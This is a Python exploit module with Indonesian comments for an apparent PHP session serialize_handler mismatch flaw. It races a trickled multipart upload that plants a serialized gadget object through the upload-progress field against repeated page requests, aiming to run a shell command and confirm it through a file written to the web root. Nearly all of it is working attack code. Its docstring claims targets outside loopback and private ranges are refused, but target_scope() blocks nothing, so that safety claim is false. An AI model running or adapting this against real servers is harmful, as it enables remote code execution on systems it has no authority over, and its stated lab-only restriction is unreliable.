"""lib/cve115560.py — CVE-2026-115560: session serialize_handler mismatch.

Kelas bug: object injection lewat session file yang ditulis serializer
server-config (pre-RINIT, rfc1867 upload progress) lalu dibaca handler
`php` (app melakukan ini_set sebelum session_start) → split di `|`
pertama → payload object di-unserialize → __destruct gadget menembak
(pada jalur success DAN failure decode).

Prasyarat (ketiganya, dari googlesky + php.net advisory 2026-10-23):
  1. server ini session.serialize_handler = php_binary | php_serialize
  2. aplikasi: ini_set('session.serialize_handler','php') sebelum session_start()
  3. session.upload_progress.enabled = On (default PHP)

BATAS PENGGUNAAN (sengaja keras):
  - Modul ini menolak target yang TIDAK loopback/private (127/8, 10/8,
    172.16/12, 192.168/16, ::1). Tidak ada override — pengujian hanya
    di lab milik sendiri. Live target = tinggal check manual + audit kode.
  - RCE butuh gadget class di aplikasi target; tanpa gadget = injection
    tanpa dampak eksekusi.

Mekanika producer/consumer (pola googlesky, dikredit):
  - PRODUCER: multipart POST lambat (trickle) berisi field PHPSESSID
    (diterima pre-RINIT dari body), PHP_SESSION_UPLOAD_PROGRESS = "|" +
    payload ter-serialize (key attacker-controlled), lalu file part besar
    dikirim perlahan → progress flush terus menulis ulang session file
    ber-servializer server → jendela racun terjaga terbuka.
  - CONSUMER: GET berulang ke halaman vuln (session_start memicu decode)
    lalu GET file bukti (gadget menulis shell_exec output ke docroot).
"""
from __future__ import annotations

import http.client
import ipaddress
import secrets
import socket
import threading
import time
import urllib.parse
from dataclasses import dataclass, field


# ---------------------------------------------------------------- gate ----
def _resolve(host: str) -> list[str]:
    try:
        return [str(ai[4][0]) for ai in socket.getaddrinfo(host, None)]
    except OSError:
        return []


def _is_ip(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def target_scope(url: str) -> str:
    """Klasifikasi scope target: 'loopback' | 'private' | 'public'.

    INFORMASI saja — TIDAK memblokir. Batas penggunaan (lab-only vs live)
    adalah keputusan operator/RoE program, bukan keputusan tool. Tool lain
    (detect/exploit 109619) juga tidak mengharamkan target publik di kode.
    """
    u = urllib.parse.urlsplit(url)
    host = u.hostname or ""
    if host == "localhost" or host.endswith(".localhost"):
        return "loopback"
    addrs = [host] if _is_ip(host) else _resolve(host)
    for a in addrs:
        try:
            ip = ipaddress.ip_address(a)
        except ValueError:
            continue
        if ip.is_loopback:
            return "loopback"
        if ip.is_private:
            return "private"
    return "public"


# ------------------------------------------------------------- payload ----
def gadget_payload(cmd: str, out_path: str = "p/R.txt") -> str:
    """Serialized LabGadget (kelas lab; app lain = gadget miliknya sendiri)."""
    return (
        'O:9:"LabGadget":2:{'
        f's:3:"cmd";s:{len(cmd)}:"{cmd}";'
        f's:3:"out";s:{len(out_path)}:"{out_path}";'
        "}"
    )


def upload_progress_value(cmd: str, out_path: str = "p/R.txt") -> str:
    """Nilai field PHP_SESSION_UPLOAD_PROGRESS: '|' + payload.

    Key session jadi `upload_progress_|O:9:"LabGadget"...` — handler `php`
    membelah di `|` pertama dan meng-unserialize sisanya.
    """
    return "|" + gadget_payload(cmd, out_path)


# ------------------------------------------------------------ transport ----
@dataclass
class RaceConfig:
    url: str
    sid: str = ""
    cmd: str = "id"
    out_path: str = "p/R.txt"
    page: str = ""                 # path halaman vuln (default: path dari url)
    total_mb: int = 4              # ukuran file part producer (trickle)
    chunk_kb: int = 16
    chunk_delay: float = 0.10      # jeda antar chunk → jaga window terbuka
    duration: float = 60.0         # batas total race (detik)
    poll: float = 0.07             # interval consumer
    stop: threading.Event = field(default_factory=threading.Event)

    def __post_init__(self) -> None:
        if not self.sid:
            self.sid = secrets.token_hex(8)
        u = urllib.parse.urlsplit(self.url)
        self.page = self.page or (u.path or "/")
        if not self.page.startswith("/"):
            self.page = "/" + self.page


def _split(url: str) -> tuple[str, int, bool]:
    u = urllib.parse.urlsplit(url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    return host, port, u.scheme == "https"


def _conn(url: str, timeout: float) -> tuple[http.client.HTTPConnection, urllib.parse.SplitResult]:
    host, port, tls = _split(url)
    u = urllib.parse.urlsplit(url)
    cls = http.client.HTTPSConnection if tls else http.client.HTTPConnection
    return cls(host, port, timeout=timeout), u


def _producer(cfg: RaceConfig) -> None:
    """Trickle multipart (requests streaming generator).

    CATATAN: http.client putrequest/send menghasilkan 400 Apache pada
    body besar (wet-run terbukti), sementara requests baku = 200 +
    sinyal decode-failure tampil. Generator bytes = trickle terjaga.
    """
    try:
        import requests  # stdlib-ecosystem transport (requests, bukan curl_cffi)

        b = "----p2s115" + secrets.token_hex(8)
        pv = upload_progress_value(cfg.cmd, cfg.out_path)
        chunk = "A" * (cfg.chunk_kb * 1024)
        n_chunks = cfg.total_mb * 1024 // cfg.chunk_kb
        pad_total = cfg.chunk_kb * 1024 * n_chunks

        def gen():
            yield (f"--{b}\r\n"
                   f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
                   f"{cfg.sid}\r\n").encode()
            yield (f"--{b}\r\n"
                   f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                   f"{pv}\r\n").encode()
            yield (f"--{b}\r\n"
                   f'Content-Disposition: form-data; name="file"; filename="f.txt"\r\n'
                   f"Content-Type: application/octet-stream\r\n\r\n").encode()
            for _ in range(n_chunks):
                if cfg.stop.is_set():
                    return
                yield chunk.encode()
                time.sleep(cfg.chunk_delay)
            yield f"\r\n--{b}--\r\n".encode()

        # chunked streaming: TANPA Content-Length supaya requests kirim
        # tiap yield benar-benar bertahap (trickle terjaga); Apache menerima
        # chunked multipart tanpa masalah.
        requests.post(
            cfg.url,
            data=gen(),
            headers={
                "Cookie": f"PHPSESSID={cfg.sid}",
                "Content-Type": f"multipart/form-data; boundary={b}",
                "Transfer-Encoding": "chunked",
            },
            timeout=(10, 30),
        )
    except Exception:  # noqa: BLE001 — producer mati tidak fatal; consumer lanjut
        pass


def _get(url: str, sid: str, timeout: float = 8.0) -> tuple[int, bytes]:
    conn, u = _conn(url, timeout)
    conn.request("GET", u.path or "/", headers={"Cookie": f"PHPSESSID={sid}"})
    r = conn.getresponse()
    return r.status, r.read(1024)


# ------------------------------------------------------------- orkestra ----
def run_race(cfg: RaceConfig, log=print) -> dict:
    """Jalankan race producer/consumer; kembalikan bukti bila RCE tercapai."""
    scope = target_scope(cfg.url)
    log(f"[x115560] scope={scope} — pastikan otorisasi (RoE) sebelum menembak")
    u = urllib.parse.urlsplit(cfg.url)
    base = f"{u.scheme}://{u.netloc}"
    proof_path = "/" + cfg.out_path.lstrip("/")
    deadline = time.time() + cfg.duration
    reads = 0

    t = threading.Thread(target=_producer, args=(cfg,), daemon=True)
    t.start()
    log(f"[x115560] race mulai — target {base} sid={cfg.sid[:12]}… "
        f"window≈{cfg.total_mb * cfg.chunk_delay / (cfg.chunk_kb / 1024):.0f}s "
        f"(file {cfg.total_mb}MB @ {cfg.chunk_kb}KB/{cfg.chunk_delay}s)")

    while time.time() < deadline and not cfg.stop.is_set():
        # 1) pemicu: session_start() di halaman vuln membaca session beracun
        try:
            _get(base + cfg.page, cfg.sid)
        except Exception:  # noqa: BLE001
            pass
        reads += 1
        # 2) bukti: gadget menulis output ke docroot
        try:
            st, body = _get(base + proof_path, cfg.sid)
            txt = body.decode("utf-8", "replace")
            if st == 200 and ("uid=" in txt or "PROOF" in txt):
                log(f"[x115560] RCE — bukti di {proof_path} (reads={reads})")
                return {"success": True, "reads": reads, "proof": txt.strip()}
        except Exception:  # noqa: BLE001
            pass
        time.sleep(cfg.poll)

    cfg.stop.set()
    return {"success": False, "reads": reads, "proof": ""}


def check_prereq(url: str, log=print) -> dict:
    """Check ringkas dari luar: info endpoint lab + sinyal decode-failure.

    Untuk lab bawaan (/info.php): kembalikan handler + upload_progress.
    Sinyal keberhasilan race di sisi server: PHP Warning
    'session_start(): Failed to decode session object' (butuh display_errors).
    """
    scope = target_scope(url)
    out: dict = {"url": url, "scope": scope}
    u = urllib.parse.urlsplit(url)
    base = f"{u.scheme}://{u.netloc}"
    try:
        st, body = _get(base + "/info.php", "<none>")
        out["info_status"] = st
        out["info"] = body.decode("utf-8", "replace")[:200]
    except Exception as exc:  # noqa: BLE001
        out["info_status"] = 0
        out["info"] = f"tidak terjangkau: {exc}"
    log(f"[x115560-check] scope={scope} {out['info_status']} {out['info'][:120]}")
    return out
